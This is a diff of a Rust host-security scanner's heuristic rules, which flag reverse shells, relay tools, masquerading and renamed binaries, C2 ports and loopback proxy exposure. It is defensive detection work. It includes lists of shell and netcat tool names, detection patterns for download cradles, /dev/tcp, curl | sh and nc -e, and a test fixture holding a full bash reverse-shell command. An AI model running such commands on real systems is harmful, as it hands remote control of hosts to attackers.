@@ -1,58 +1,12 @@
 use crate::models::{
     ConnectionEntry, ExposureScope, IpCategory, ProcessRecord, SecurityFinding, Severity,
 };
+use crate::scanner::indicators::{
+    check_suspicious_cmdline, check_suspicious_exec_path, is_relay_name, is_shell_name,
+    SENSITIVE_ORIGINAL_BINARIES, SERVER_PARENTS,
+};
 use crate::scanner::ports_db::{check_backdoor_port, check_sensitive_wildcard_port};
 use std::collections::{HashMap, HashSet};
-
-const SHELL_NAMES: &[&str] = &[
-    "sh",
-    "bash",
-    "zsh",
-    "dash",
-    "ksh",
-    "tcsh",
-    "csh",
-    "fish",
-    "cmd.exe",
-    "cmd",
-    "powershell.exe",
-    "powershell",
-    "pwsh.exe",
-    "pwsh",
-];
-
-const NETCAT_TOOLS: &[&str] = &[
-    "nc",
-    "nc.exe",
-    "ncat",
-    "ncat.exe",
-    "netcat",
-    "netcat.exe",
-    "socat",
-    "socat.exe",
-    "cryptcat",
-    "powercat",
-];
-
-const SERVER_PARENTS: &[&str] = &[
-    "nginx",
-    "apache2",
-    "httpd",
-    "httpd.exe",
-    "w3wp.exe",
-    "php-fpm",
-    "php-cgi",
-    "php-cgi.exe",
-    "sqlservr.exe",
-    "mysqld",
-    "mysqld.exe",
-    "postgres",
-    "postgres.exe",
-    "redis-server",
-    "mongod",
-    "mongod.exe",
-    "tomcat",
-];
 
 #[derive(Default)]
 struct FindingCollector {
@@ -78,14 +32,23 @@ pub fn evaluate_security_heuristics(
 ) -> Vec<SecurityFinding> {
     let mut collector = FindingCollector::default();
 
-    let listen_ports: HashSet<u16> = connections
+    // Key by (is_tcp, local_port) so an open UDP port cannot suppress outbound TCP C2 detection.
+    let listen_ports: HashSet<(bool, u16)> = connections
         .iter()
         .filter(|c| c.is_listening())
-        .map(|c| c.local_port)
+        .map(|c| (c.protocol.is_tcp(), c.local_port))
         .collect();
+
     for conn in connections.iter_mut() {
-        evaluate_connection(conn, &listen_ports, &mut collector);
+        let orig_lower = conn
+            .pid
+            .and_then(|pid| processes.get(&pid))
+            .and_then(|p| p.original_filename.as_deref())
+            .map(str::to_lowercase);
+        evaluate_connection(conn, orig_lower.as_deref(), &listen_ports, &mut collector);
     }
+
+    evaluate_loopback_proxy_graph(connections, &mut collector);
 
     for proc_rec in processes.values_mut() {
         evaluate_process(proc_rec, &mut collector);
@@ -199,6 +162,12 @@ const MASQUERADING: Rule = Rule {
     mitre: "T1036.005",
     remediation: "Verify the binary hash against clean OS files and terminate if unauthorized.",
 };
+const RENAMED_BINARY: Rule = Rule {
+    id: "H04-RENAMED-BINARY",
+    category: "Renamed System / LOLBin Binary",
+    mitre: "T1036.003",
+    remediation: "Inspect PE version metadata, verify why a system utility was renamed, and quarantine if unauthorized.",
+};
 const BACKDOOR_PORT: Rule = Rule {
     id: "H05-BACKDOOR-PORT",
     category: "Suspicious Port",
@@ -230,19 +199,26 @@ const OBFUSCATED_CMD: Rule = Rule {
     mitre: "T1027",
     remediation: "Decode the payload, inspect parent process lineage, and terminate if unauthorized.",
 };
+const PROXY_EXPOSURE: Rule = Rule {
+    id: "H08-PROXY-EXPOSURE",
+    category: "Transitive Loopback Proxy Exposure",
+    mitre: "T1090.001",
+    remediation: "Verify reverse-proxy upstream ACLs/authentication so internal 127.0.0.1 services are not unintentionally exposed to external networks.",
+};
 
 /// Lowercased text of one socket's owner, computed once for all socket rules.
-struct SocketView {
+struct SocketView<'a> {
     proc_lower: String,
+    orig_lower: Option<&'a str>,
     exe_lower: String,
     cmd_lower: String,
     is_listening: bool,
-    /// On a port this host listens on. Its remote port is the peer's random source port,
-    /// so the outbound C2 port rule must not read it.
+    /// On a port this host listens on (matching protocol family). Its remote port is the peer's
+    /// random source port, so the outbound C2 port rule must not read it.
     is_inbound: bool,
 }
 
-type SocketRule = fn(&mut ConnectionEntry, &SocketView, &mut FindingCollector);
+type SocketRule = fn(&mut ConnectionEntry, &SocketView<'_>, &mut FindingCollector);
 
 /// The order only decides the order of `risk_reasons`.
 const SOCKET_RULES: [SocketRule; 8] = [
@@ -258,30 +234,155 @@ const SOCKET_RULES: [SocketRule; 8] = [
 
 fn evaluate_connection(
     conn: &mut ConnectionEntry,
-    listen_ports: &HashSet<u16>,
+    orig_lower: Option<&str>,
+    listen_ports: &HashSet<(bool, u16)>,
     collector: &mut FindingCollector,
 ) {
     let is_listening = conn.is_listening();
+    let is_tcp = conn.protocol.is_tcp();
     let view = SocketView {
         proc_lower: conn.process_name.to_lowercase(),
+        orig_lower,
         exe_lower: conn.exe_path.to_lowercase().replace('/', "\\"),
         cmd_lower: conn.cmdline.to_lowercase(),
         is_listening,
-        is_inbound: !is_listening && listen_ports.contains(&conn.local_port),
+        is_inbound: !is_listening && listen_ports.contains(&(is_tcp, conn.local_port)),
     };
     for rule in SOCKET_RULES {
         rule(conn, &view, collector);
     }
 }
 
-/// H01: an interactive shell holds a socket.
-fn shell_owns_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
-    if !SHELL_NAMES.contains(&v.proc_lower.as_str()) {
+/// H08: Detects transitive exposure when a process listening on a network-reachable interface
+/// (`0.0.0.0`, `::`, LAN, or Public IP) simultaneously holds active loopback connections forwarding
+/// to a `127.0.0.1` / `[::1]` backend listener, upgrading that backend to `LoopbackProxy`.
+fn evaluate_loopback_proxy_graph(
+    connections: &mut [ConnectionEntry],
+    out: &mut FindingCollector,
+) {
+    // Map each PID owning a network-reachable listener -> (process_name, external_port, scope).
+    let mut exposed_pids: HashMap<u32, (String, u16, ExposureScope)> = HashMap::new();
+    let mut loopback_listen_ports: HashSet<u16> = HashSet::new();
+
+    for c in connections.iter() {
+        if c.is_listening() {
+            if c.exposure.is_network_reachable() {
+                if let Some(pid) = c.pid {
+                    exposed_pids
+                        .entry(pid)
+                        .or_insert_with(|| (c.process_name.clone(), c.local_port, c.exposure));
+                }
+            } else if c.protocol.is_tcp() && c.exposure == ExposureScope::Loopback {
+                loopback_listen_ports.insert(c.local_port);
+            }
+        }
+    }
+
+    if exposed_pids.is_empty() || loopback_listen_ports.is_empty() {
+        return;
+    }
+
+    // Identify loopback backend ports targeted by active TCP forwarding sockets from exposed PIDs.
+    let mut proxied_targets: HashMap<u16, (u32, String, u16, ExposureScope)> = HashMap::new();
+    for c in connections.iter() {
+        if c.is_listening() || !c.protocol.is_tcp() || c.remote_category != IpCategory::Loopback {
+            continue;
+        }
+        let Some(pid) = c.pid else { continue };
+        let Some((proxy_name, ext_port, ext_scope)) = exposed_pids.get(&pid) else {
+            continue;
+        };
+        let Some(target_port) = c.remote_port else {
+            continue;
+        };
+        if c.local_port != target_port && loopback_listen_ports.contains(&target_port) {
+            proxied_targets.entry(target_port).or_insert_with(|| {
+                (pid, proxy_name.clone(), *ext_port, *ext_scope)
+            });
+        }
+    }
+
+    if proxied_targets.is_empty() {
+        return;
+    }
+
+    for conn in connections.iter_mut() {
+        if !conn.is_listening()
+            || !conn.protocol.is_tcp()
+            || conn.exposure != ExposureScope::Loopback
+        {
+            continue;
+        }
+        let Some((proxy_pid, proxy_name, ext_port, ext_scope)) =
+            proxied_targets.get(&conn.local_port)
+        else {
+            continue;
+        };
+
+        conn.exposure = ExposureScope::LoopbackProxy;
+        let sev = if check_sensitive_wildcard_port(conn.local_port).is_some() {
+            Severity::High
+        } else {
+            Severity::Medium
+        };
+        let reason = format!(
+            "Loopback service transitively reachable via '{}' (PID {}, {} port {})",
+            proxy_name,
+            proxy_pid,
+            ext_scope.short_label(),
+            ext_port
+        );
+        conn.elevate_severity(sev, reason);
+
+        let finding = PROXY_EXPOSURE
+            .finding(
+                sev,
+                format!(
+                    "Loopback Port {} Transitively Exposed via Proxy '{}' (Port {})",
+                    conn.local_port, proxy_name, ext_port
+                ),
+                format!(
+                    "Service '{}' (PID {}) listens on loopback {}, but network-exposed process '{}' (PID {}, listening on {} port {}) holds an active loopback forwarding socket to port {}.",
+                    conn.process_name,
+                    conn.pid.unwrap_or(0),
+                    conn.local_endpoint(),
+                    proxy_name,
+                    proxy_pid,
+                    ext_scope.short_label(),
+                    ext_port,
+                    conn.local_port
+                ),
+                format!(
+                    "External Listener: {} (PID {}, port {}) -> Loopback Backend: {} ({}, PID {})",
+                    proxy_name,
+                    proxy_pid,
+                    ext_port,
+                    conn.local_endpoint(),
+                    conn.process_name,
+                    conn.pid.unwrap_or(0)
+                ),
+            )
+            .at_socket(conn, conn.local_endpoint());
+        out.insert(
+            format!("H08-PROXY-{}-{:?}", conn.local_port, conn.pid),
+            finding,
+        );
+    }
+}
+
+/// H01: an interactive shell (including a renamed shell binary) holds a socket.
+fn shell_owns_socket(conn: &mut ConnectionEntry, v: &SocketView<'_>, out: &mut FindingCollector) {
+    let matches_shell =
+        is_shell_name(&v.proc_lower) || v.orig_lower.is_some_and(is_shell_name);
+    if !matches_shell {
         return;
     }
     conn.elevate_severity(
         Severity::Critical,
-        format!("Command shell '{}' owns a network socket ({})", conn.process_name, conn.state),
+        format!(
+            "Command shell '{}' owns a network socket ({})",
+            conn.process_name, conn.state
+        ),
     );
     let finding = REV_SHELL
         .finding(
@@ -295,15 +396,27 @@ fn shell_owns_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut Findi
                 conn.local_endpoint(),
                 conn.remote_display()
             ),
-            format!("Lineage: {} | Cmd: {}", conn.lineage.join(" -> "), conn.cmdline),
+            format!(
+                "Lineage: {} | Cmd: {}",
+                conn.lineage.join(" -> "),
+                conn.cmdline
+            ),
         )
-        .at_socket(conn, format!("{} -> {}", conn.local_endpoint(), conn.remote_endpoint()));
-    out.insert(format!("H01-SHELL-{}-{:?}", conn.process_name, conn.pid), finding);
+        .at_socket(
+            conn,
+            format!("{} -> {}", conn.local_endpoint(), conn.remote_endpoint()),
+        );
+    out.insert(
+        format!("H01-SHELL-{}-{:?}", conn.process_name, conn.pid),
+        finding,
+    );
 }
 
 /// H01: netcat, socat and similar relays hold a socket.
-fn relay_tool_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
-    if !NETCAT_TOOLS.contains(&v.proc_lower.as_str()) {
+fn relay_tool_socket(conn: &mut ConnectionEntry, v: &SocketView<'_>, out: &mut FindingCollector) {
+    let matches_relay =
+        is_relay_name(&v.proc_lower) || v.orig_lower.is_some_and(is_relay_name);
+    if !matches_relay {
         return;
     }
     conn.elevate_severity(
@@ -324,11 +437,14 @@ fn relay_tool_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut Findi
             format!("Cmd: {} | Exe: {}", conn.cmdline, conn.exe_path),
         )
         .at_socket(conn, conn.local_endpoint());
-    out.insert(format!("H01-NETCAT-{}-{:?}", conn.process_name, conn.pid), finding);
+    out.insert(
+        format!("H01-NETCAT-{}-{:?}", conn.process_name, conn.pid),
+        finding,
+    );
 }
 
 /// H01: an interpreter runs an inline socket or PTY payload.
-fn inline_script_shell(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+fn inline_script_shell(conn: &mut ConnectionEntry, v: &SocketView<'_>, out: &mut FindingCollector) {
     if !is_scripting_reverse_shell(&v.proc_lower, &v.cmd_lower) {
         return;
     }
@@ -348,12 +464,15 @@ fn inline_script_shell(conn: &mut ConnectionEntry, v: &SocketView, out: &mut Fin
             ),
             format!("Cmdline: {}", conn.cmdline),
         )
-        .at_socket(conn, format!("{} -> {}", conn.local_endpoint(), conn.remote_endpoint()));
+        .at_socket(
+            conn,
+            format!("{} -> {}", conn.local_endpoint(), conn.remote_endpoint()),
+        );
     out.insert(format!("H01-SCRIPT-SHELL-{:?}", conn.pid), finding);
 }
 
 /// H02: the socket owner runs from a temp or world-writable folder.
-fn temp_path_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+fn temp_path_socket(conn: &mut ConnectionEntry, v: &SocketView<'_>, out: &mut FindingCollector) {
     let Some(reason) = check_suspicious_exec_path(&conn.exe_path, &v.exe_lower) else {
         return;
     };
@@ -361,7 +480,10 @@ fn temp_path_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut Findin
     let finding = TEMP_NET_EXEC
         .finding(
             Severity::Critical,
-            format!("Network-Active Binary in Temp/Writable Path ({})", conn.process_name),
+            format!(
+                "Network-Active Binary in Temp/Writable Path ({})",
+                conn.process_name
+            ),
             format!(
                 "Process '{}' (PID {}) has active socket {} while running from {}.",
                 conn.process_name,
@@ -372,11 +494,14 @@ fn temp_path_socket(conn: &mut ConnectionEntry, v: &SocketView, out: &mut Findin
             format!("Exe: {}", conn.exe_path),
         )
         .at_socket(conn, conn.local_endpoint());
-    out.insert(format!("H02-NET-PATH-{:?}-{}", conn.pid, conn.exe_path), finding);
+    out.insert(
+        format!("H02-NET-PATH-{:?}-{}", conn.pid, conn.exe_path),
+        finding,
+    );
 }
 
 /// H05: a listener, or a socket on a fixed low port, uses a known C2 or RAT port.
-fn c2_port_local(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+fn c2_port_local(conn: &mut ConnectionEntry, v: &SocketView<'_>, out: &mut FindingCollector) {
     // Ports from 32768 up on a non-listening socket are OS-chosen source ports.
     if !(v.is_listening || conn.local_port < 32768) {
         return;
@@ -384,7 +509,10 @@ fn c2_port_local(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCo
     let Some(intel) = check_backdoor_port(conn.local_port) else {
         return;
     };
-    conn.elevate_severity(intel.severity, format!("{}: {}", intel.threat_name, intel.reason));
+    conn.elevate_severity(
+        intel.severity,
+        format!("{}: {}", intel.threat_name, intel.reason),
+    );
     let finding = BACKDOOR_PORT
         .finding(
             intel.severity,
@@ -408,11 +536,14 @@ fn c2_port_local(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCo
             ),
         )
         .at_socket(conn, conn.local_endpoint());
-    out.insert(format!("H05-LOCAL-PORT-{}-{:?}", conn.local_port, conn.pid), finding);
+    out.insert(
+        format!("H05-LOCAL-PORT-{}-{:?}", conn.local_port, conn.pid),
+        finding,
+    );
 }
 
 /// H05: an outbound connection goes to a known C2, RAT or mining port.
-fn c2_port_remote(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+fn c2_port_remote(conn: &mut ConnectionEntry, v: &SocketView<'_>, out: &mut FindingCollector) {
     let Some(rem_port) = conn.remote_port.filter(|_| !v.is_inbound) else {
         return;
     };
@@ -421,12 +552,18 @@ fn c2_port_remote(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingC
     };
     conn.elevate_severity(
         intel.severity,
-        format!("Outbound connection to {}: {}", intel.threat_name, intel.reason),
+        format!(
+            "Outbound connection to {}: {}",
+            intel.threat_name, intel.reason
+        ),
     );
     let finding = OUTBOUND_C2_PORT
         .finding(
             intel.severity,
-            format!("Outbound Connection to Port {} ({})", rem_port, intel.threat_name),
+            format!(
+                "Outbound Connection to Port {} ({})",
+                rem_port, intel.threat_name
+            ),
             format!(
                 "Process '{}' (PID {}) is connected to {} on port {}. {}",
                 conn.process_name,
@@ -447,7 +584,11 @@ fn c2_port_remote(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingC
 }
 
 /// H06: a sensitive service listens on 0.0.0.0 or ::. Any other TCP listener there is Low.
-fn all_interfaces_listener(conn: &mut ConnectionEntry, v: &SocketView, out: &mut FindingCollector) {
+fn all_interfaces_listener(
+    conn: &mut ConnectionEntry,
+    v: &SocketView<'_>,
+    out: &mut FindingCollector,
+) {
     if !(v.is_listening && conn.exposure == ExposureScope::WildcardAllInterfaces) {
         return;
     }
@@ -470,7 +611,10 @@ fn all_interfaces_listener(conn: &mut ConnectionEntry, v: &SocketView, out: &mut
     let mut finding = EXPOSED_SERVICE
         .finding(
             rule.severity,
-            format!("{} (Port {}) Exposed on All Interfaces", rule.service, rule.port),
+            format!(
+                "{} (Port {}) Exposed on All Interfaces",
+                rule.service, rule.port
+            ),
             format!(
                 "{} Process '{}' (PID {}) is listening on {}.",
                 rule.risk_summary,
@@ -488,11 +632,18 @@ fn all_interfaces_listener(conn: &mut ConnectionEntry, v: &SocketView, out: &mut
         )
         .at_socket(conn, conn.local_endpoint());
     finding.remediation = rule.remediation.to_string();
-    out.insert(format!("H06-WILDCARD-{}-{}", conn.local_port, conn.process_name), finding);
+    out.insert(
+        format!("H06-WILDCARD-{}-{}", conn.local_port, conn.process_name),
+        finding,
+    );
 }
 
 /// Low: a public peer talks to a process whose binary path is unknown.
-fn unresolved_external_peer(conn: &mut ConnectionEntry, _v: &SocketView, _out: &mut FindingCollector) {
+fn unresolved_external_peer(
+    conn: &mut ConnectionEntry,
+    _v: &SocketView<'_>,
+    _out: &mut FindingCollector,
+) {
     if conn.remote_category == IpCategory::PublicInternet
         && conn.exe_path.is_empty()
         && conn.pid.unwrap_or(0) > 4
@@ -508,15 +659,17 @@ fn unresolved_external_peer(conn: &mut ConnectionEntry, _v: &SocketView, _out: &
 /// Lowercased text of one process, computed once for all process rules.
 struct ProcessView {
     name_lower: String,
+    orig_lower: Option<String>,
     exe_lower: String,
     cmd_lower: String,
 }
 
 type ProcessRule = fn(&mut ProcessRecord, &ProcessView, &mut FindingCollector);
 
-const PROCESS_RULES: [ProcessRule; 5] = [
+const PROCESS_RULES: [ProcessRule; 6] = [
     deleted_binary,
     masquerading,
+    renamed_pe_binary,
     temp_path_process,
     server_spawned_shell,
     suspicious_cmdline,
@@ -525,6 +678,10 @@ const PROCESS_RULES: [ProcessRule; 5] = [
 fn evaluate_process(proc_rec: &mut ProcessRecord, collector: &mut FindingCollector) {
     let view = ProcessView {
         name_lower: proc_rec.name.to_lowercase(),
+        orig_lower: proc_rec
+            .original_filename
+            .as_deref()
+            .map(str::to_lowercase),
         exe_lower: proc_rec.exe_path.to_lowercase().replace('/', "\\"),
         cmd_lower: proc_rec.cmdline.to_lowercase(),
     };
@@ -564,7 +721,7 @@ fn deleted_binary(p: &mut ProcessRecord, _v: &ProcessView, out: &mut FindingColl
     out.insert(format!("H03-DELETED-{}", p.pid), finding);
 }
 
-/// H04: typosquats, kernel-thread look-alikes, and system binaries outside System32.
+/// H04: typosquats, kernel-thread look-alikes, and system binaries outside exact System32/SysWOW64/WinSxS.
 fn masquerading(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
     let Some((sev, reason)) =
         check_process_masquerading(&v.name_lower, &v.cmd_lower, &v.exe_lower, &p.exe_path)
@@ -581,6 +738,46 @@ fn masquerading(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollect
         )
         .at_process(p);
     out.insert(format!("H04-MASQ-{}", p.pid), finding);
+}
+
+/// H04-RENAMED-BINARY: PE `VS_VERSION_INFO` `OriginalFilename` identifies a sensitive Windows
+/// shell, relay, or LOLBin whose on-disk executable name was changed (MITRE T1036.003).
+fn renamed_pe_binary(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
+    let Some(orig_lower) = v.orig_lower.as_deref() else {
+        return;
+    };
+    if !SENSITIVE_ORIGINAL_BINARIES.contains(&orig_lower) {
+        return;
+    }
+    let orig_stem = orig_lower.strip_suffix(".exe").unwrap_or(orig_lower);
+    let active_stem = v
+        .name_lower
+        .strip_suffix(".exe")
+        .unwrap_or(&v.name_lower);
+    if orig_stem == active_stem {
+        return;
+    }
+
+    raise_severity(p, Severity::Critical);
+    let raw_orig = p.original_filename.as_deref().unwrap_or(orig_lower);
+    let finding = RENAMED_BINARY
+        .finding(
+            Severity::Critical,
+            format!(
+                "Renamed System Utility / LOLBin: '{}' is '{}' (PID {})",
+                p.name, raw_orig, p.pid
+            ),
+            format!(
+                "Process '{}' (PID {}) has embedded PE OriginalFilename '{}', indicating a copied and renamed system binary.",
+                p.name, p.pid, raw_orig
+            ),
+            format!(
+                "Exe: {} | OriginalFilename: {} | Cmd: {}",
+                p.exe_path, raw_orig, p.cmdline
+            ),
+        )
+        .at_process(p);
+    out.insert(format!("H04-RENAMED-{}", p.pid), finding);
 }
 
 /// H02: the process runs from a temp folder. Skipped when the socket rule already reported it.
@@ -601,20 +798,27 @@ fn temp_path_process(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCo
         .finding(
             sev,
             format!("Process Running from Temp/Writable Directory ({})", p.name),
-            format!("Process '{}' (PID {}) is executing from {}.", p.name, p.pid, reason),
+            format!(
+                "Process '{}' (PID {}) is executing from {}.",
+                p.name, p.pid, reason
+            ),
             format!("Exe: {} | Cmd: {}", p.exe_path, p.cmdline),
         )
         .at_process(p);
     out.insert(format!("H02-PROC-PATH-{}", p.pid), finding);
 }
 
-/// H06: a web or database server is the direct parent of a shell.
+/// H06: a web or database server appears anywhere in the ancestor chain of a shell.
 fn server_spawned_shell(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
-    if !SHELL_NAMES.contains(&v.name_lower.as_str()) || p.lineage.len() < 2 {
+    let is_shell = is_shell_name(&v.name_lower) || v.orig_lower.as_deref().is_some_and(is_shell_name);
+    if !is_shell || p.lineage.len() < 2 {
         return;
     }
-    let parent_entry = p.lineage[p.lineage.len() - 2].to_lowercase();
-    if !SERVER_PARENTS.iter().any(|&srv| parent_entry.starts_with(srv)) {
+    let has_server_ancestor = p.lineage[..p.lineage.len() - 1].iter().any(|entry| {
+        let ancestor_name = entry.split('(').next().unwrap_or(entry).to_lowercase();
+        SERVER_PARENTS.contains(&ancestor_name.as_str())
+    });
+    if !has_server_ancestor {
         return;
     }
     raise_severity(p, Severity::Critical);
@@ -623,7 +827,7 @@ fn server_spawned_shell(p: &mut ProcessRecord, v: &ProcessView, out: &mut Findin
             Severity::Critical,
             format!("Server Daemon Spawned Shell ({})", p.name),
             format!(
-                "Shell '{}' (PID {}) was spawned by server process '{}'.",
+                "Shell '{}' (PID {}) was spawned under server ancestor chain '{}'.",
                 p.name,
                 p.pid,
                 p.lineage.join(" -> ")
@@ -636,7 +840,9 @@ fn server_spawned_shell(p: &mut ProcessRecord, v: &ProcessView, out: &mut Findin
 
 /// H07: encoded PowerShell, download cradles, /dev/tcp, curl | sh, LOLBins.
 fn suspicious_cmdline(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingCollector) {
-    let Some((sev, indicator)) = check_suspicious_cmdline(&v.name_lower, &v.cmd_lower) else {
+    let Some((sev, indicator)) =
+        check_suspicious_cmdline(&v.name_lower, v.orig_lower.as_deref(), &v.cmd_lower)
+    else {
         return;
     };
     raise_severity(p, sev);
@@ -644,7 +850,10 @@ fn suspicious_cmdline(p: &mut ProcessRecord, v: &ProcessView, out: &mut FindingC
         .finding(
             sev,
             format!("Suspicious Command-Line Payload in {} (PID {})", p.name, p.pid),
-            format!("Process '{}' launched with arguments matching: {}.", p.name, indicator),
+            format!(
+                "Process '{}' launched with arguments matching: {}.",
+                p.name, indicator
+            ),
             format!("Cmdline: {}", p.cmdline),
         )
         .at_process(p);
@@ -692,37 +901,28 @@ fn is_scripting_reverse_shell(proc_lower: &str, cmd_lower: &str) -> bool {
     indicators.iter().any(|&ind| cmd_lower.contains(ind))
 }
 
-fn check_suspicious_exec_path(raw_path: &str, exe_lower: &str) -> Option<String> {
-    if raw_path.is_empty() {
-        return None;
-    }
-
-    if raw_path.starts_with("/tmp/")
-        || raw_path.starts_with("/var/tmp/")
-        || raw_path.starts_with("/dev/shm/")
-        || raw_path.starts_with("/run/shm/")
+fn is_valid_windows_system_dir(exe_lower: &str) -> bool {
+    let stripped = exe_lower.strip_prefix(r"\\?\").unwrap_or(exe_lower);
+    let bytes = stripped.as_bytes();
+    if bytes.len() <= 3
+        || !bytes[0].is_ascii_alphabetic()
+        || bytes[1] != b':'
+        || bytes[2] != b'\\'
     {
-        return Some(format!(
-            "Linux temporary/shared-memory directory ({})",
-            raw_path
-        ));
+        return false;
     }
+    let rel = &stripped[3..];
+    let Some((dir, _filename)) = rel.rsplit_once('\\') else {
+        return false;
+    };
 
-    let win_suspicious = [
-        ("\\appdata\\local\\temp\\", "User AppData Local Temp folder"),
-        ("\\windows\\temp\\", "Windows system Temp folder"),
-        ("\\users\\public\\", "Windows Public Users folder"),
-        ("\\$recycle.bin\\", "Windows Recycle Bin"),
-        ("\\perflogs\\", "Windows PerfLogs directory"),
-    ];
-
-    for (pattern, desc) in win_suspicious {
-        if exe_lower.contains(pattern) {
-            return Some(format!("{} ({})", desc, raw_path));
-        }
+    if dir == r"windows\system32" || dir == r"windows\syswow64" {
+        return true;
     }
-
-    None
+    if let Some(pkg) = dir.strip_prefix(r"windows\winsxs\") {
+        return !pkg.is_empty() && !pkg.contains('\\');
+    }
+    false
 }
 
 fn check_process_masquerading(
@@ -787,89 +987,15 @@ fn check_process_masquerading(
             "spoolsv.exe",
             "taskhostw.exe",
         ];
-        if win_sys32_only.contains(&name_lower) {
-            let valid = exe_lower.contains(":\\windows\\system32\\")
-                || exe_lower.contains(":\\windows\\syswow64\\")
-                || exe_lower.contains(":\\windows\\winsxs\\");
-            if !valid {
-                return Some((
-                    Severity::Critical,
-                    format!(
-                        "Windows system process '{}' is running from non-standard path '{}'.",
-                        name_lower, raw_exe
-                    ),
-                ));
-            }
-        }
-    }
-
-    None
-}
-
-fn check_suspicious_cmdline(name_lower: &str, cmd_lower: &str) -> Option<(Severity, &'static str)> {
-    if name_lower.starts_with("powershell") || name_lower.starts_with("pwsh") {
-        if cmd_lower.contains(" -enc ")
-            || cmd_lower.contains(" -encodedcommand ")
-            || cmd_lower.contains("frombase64string")
-        {
-            return Some((
-                Severity::High,
-                "Base64-encoded PowerShell command (-EncodedCommand / FromBase64String)",
-            ));
-        }
-        if cmd_lower.contains("downloadstring(")
-            || cmd_lower.contains("downloaddata(")
-            || (cmd_lower.contains("iex") && cmd_lower.contains("http"))
-            || (cmd_lower.contains("invoke-expression") && cmd_lower.contains("http"))
-        {
+        if win_sys32_only.contains(&name_lower) && !is_valid_windows_system_dir(exe_lower) {
             return Some((
                 Severity::Critical,
-                "PowerShell remote download cradle (IEX / DownloadString)",
+                format!(
+                    "Windows system process '{}' is running from non-standard path '{}'.",
+                    name_lower, raw_exe
+                ),
             ));
         }
-    }
-
-    if cmd_lower.contains("/dev/tcp/") || cmd_lower.contains("/dev/udp/") {
-        return Some((
-            Severity::Critical,
-            "Bash /dev/tcp or /dev/udp socket redirection",
-        ));
-    }
-
-    if (cmd_lower.contains("curl ") || cmd_lower.contains("wget "))
-        && (cmd_lower.contains("| sh")
-            || cmd_lower.contains("| bash")
-            || cmd_lower.contains("|sh")
-            || cmd_lower.contains("|bash"))
-    {
-        return Some((
-            Severity::High,
-            "Remote script piped directly into shell (curl/wget | sh)",
-        ));
-    }
-
-    if cmd_lower.contains("nc -e ")
-        || cmd_lower.contains("ncat -e ")
-        || cmd_lower.contains("mkfifo /tmp/")
-    {
-        return Some((
-            Severity::Critical,
-            "Netcat -e / named-pipe reverse shell execution",
-        ));
-    }
-
-    if (name_lower.starts_with("mshta")
-        || name_lower.starts_with("regsvr32")
-        || name_lower.starts_with("rundll32"))
-        && (cmd_lower.contains("http://")
-            || cmd_lower.contains("https://")
-            || cmd_lower.contains("javascript:")
-            || cmd_lower.contains("vbscript:"))
-    {
-        return Some((
-            Severity::Critical,
-            "Windows LOLBin (mshta/regsvr32/rundll32) executing remote or scriptlet payload",
-        ));
     }
 
     None
@@ -916,6 +1042,7 @@ mod tests {
                 cmdline: "bash -i >& /dev/tcp/198.51.100.99/4444 0>&1".to_string(),
                 user: "www-data".to_string(),
                 sha256: None,
+                original_filename: None,
                 lineage: vec!["nginx(400)".to_string(), "bash(9001)".to_string()],
                 cpu_usage: 0.5,
                 memory_bytes: 4096,
@@ -950,7 +1077,11 @@ mod tests {
                 cmdline: r"C:\Users\admin\AppData\Local\Temp\svchost.exe".to_string(),
                 user: "admin".to_string(),
                 sha256: None,
-                lineage: vec!["explorer.exe(1000)".to_string(), "svchost.exe(6660)".to_string()],
+                original_filename: None,
+                lineage: vec![
+                    "explorer.exe(1000)".to_string(),
+                    "svchost.exe(6660)".to_string(),
+                ],
                 cpu_usage: 12.0,
                 memory_bytes: 1024 * 1024,
                 run_time_secs: 60,
@@ -971,7 +1102,11 @@ mod tests {
                 cmdline: "[kworker/0:1]".to_string(),
                 user: "root".to_string(),
                 sha256: None,
-                lineage: vec!["systemd(1)".to_string(), "[kworker/0:1](7770)".to_string()],
+                original_filename: None,
+                lineage: vec![
+                    "systemd(1)".to_string(),
+                    "[kworker/0:1](7770)".to_string(),
+                ],
                 cpu_usage: 95.0,
                 memory_bytes: 8 * 1024 * 1024,
                 run_time_secs: 300,
@@ -983,20 +1118,42 @@ mod tests {
         );
 
         let findings = evaluate_security_heuristics(&mut connections, &mut processes);
-        assert!(findings.iter().any(|f| f.rule_id == "H04-MASQUERADING" && f.pid == Some(6660)));
-        assert!(findings.iter().any(|f| f.rule_id == "H02-TEMP-EXEC" && f.pid == Some(6660)));
-        assert!(findings.iter().any(|f| f.rule_id == "H03-FILELESS-BINARY" && f.pid == Some(7770)));
-        assert!(findings.iter().any(|f| f.rule_id == "H04-MASQUERADING" && f.pid == Some(7770)));
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == "H04-MASQUERADING" && f.pid == Some(6660)));
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == "H02-TEMP-EXEC" && f.pid == Some(6660)));
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == "H03-FILELESS-BINARY" && f.pid == Some(7770)));
+        assert!(findings
+            .iter()
+            .any(|f| f.rule_id == "H04-MASQUERADING" && f.pid == Some(7770)));
+
+        // Writable subdirectory under System32 (`System32\Tasks\svchost.exe`) must NOT bypass H04.
+        let sub_bypass = check_process_masquerading(
+            "svchost.exe",
+            "svchost.exe",
+            r"c:\windows\system32\tasks\svchost.exe",
+            r"C:\Windows\System32\Tasks\svchost.exe",
+        );
